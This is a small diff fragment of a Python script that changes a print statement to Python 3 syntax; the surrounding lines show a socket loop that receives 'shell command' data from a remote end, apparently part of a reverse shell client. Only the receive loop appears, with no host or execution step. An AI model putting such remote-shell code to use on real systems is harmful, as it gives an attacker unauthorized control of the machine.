@@ -11,7 +11,7 @@ s.send('[*] Connection Established!')
 while 1:
     # recieve shell command
     data = s.recv(1024)
-    print data
+    print(data)
 
     # if its quit, then break out and close socket
     if data == "quit": 
